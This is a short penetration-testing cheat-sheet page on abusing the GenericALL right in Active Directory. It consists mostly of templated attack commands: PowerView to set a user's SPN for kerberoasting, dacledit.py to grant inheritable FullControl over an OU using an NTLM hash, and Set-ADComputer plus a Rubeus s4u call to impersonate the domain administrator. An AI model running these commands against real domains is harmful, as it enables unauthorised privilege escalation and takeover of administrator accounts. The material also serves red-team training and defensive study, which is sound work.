# GenericALL

## Abuse

### On a User

If we have sufficient right, a target user's SPN can be set to anything in the domain (unique in the domain) and then kerberoasted

To set the SPN to the user using powerview:

{% code overflow="wrap" %}
```powershell
Set-DomainObject -Identity <$Target user> -Set @{serviceprincipalname='<$Domain/myspn>'}
```
{% endcode %}

now you can [kerberoast ](../kerberoasting.md)it.

### On a OU

and use it to modify the dacl on computers OU (All sub object will inherite the dacl)

{% code overflow="wrap" %}
```
./dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<$Controlled User>' -target-dn '<$Object CN>' -hashes '<$Full NTLM>' -dc-ip <$IP Dc> <$Domain/Controlled User>
```
{% endcode %}

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/Pasted%20image%2020240315151638.png" alt=""><figcaption></figcaption></figure>

Now you will have GenericALL on all the machine in the OU.

### Over Computer Object

Set RBCD to a machine that yoy own:

{% code overflow="wrap" %}
```
Set-ADComputer -Identity <$Target> -PrincipalsAllowedToDelegateToAccount <Owned$> -Verbose
```
{% endcode %}

Now use rubeus to use a s4u attack

{% code overflow="wrap" %}
```powershell
Rubeus.exe s4u /user:<Own>$  /aes256:<aes256>/msdsspn:<$service target> /impersonateuser:administrator /ptt
```
{% endcode %}

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image%20(7).png" alt=""><figcaption></figcaption></figure>

\
